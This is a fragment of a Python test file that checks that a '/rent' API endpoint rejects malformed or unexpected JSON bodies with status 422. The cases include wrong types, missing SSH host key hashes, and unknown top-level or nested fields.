    assert client.post("/rent", json=[1, 2]).status_code == 422
    assert client.post("/rent", json={"schema": "lium.local_rent/1", "nonce": "short"}).status_code == 422
    assert client.post("/rent", json={**_body().model_dump(by_alias=True), "deadline_s": 99999, "signature": "0x00"}).status_code == 422
    unbound = {**_body().model_dump(by_alias=True), "signature": "0x00"}
    del unbound["ssh_host_key_sha256"]
    assert client.post("/rent", json=unbound).status_code == 422
    # An unknown field, top-level or inside a step, is refused (extra="forbid" on the whole wire),
    # never silently honoured: a newer validator's `steps.ready.<field>` must not be dropped here.
    surprise = {**_body().model_dump(by_alias=True), "signature": "0x00", "priority": 1}
    assert client.post("/rent", json=surprise).status_code == 422
    nested = _body().model_dump(by_alias=True)
    nested["steps"]["ready"]["surprise"] = 1
    assert client.post("/rent", json={**nested, "signature": "0x00"}).status_code == 422
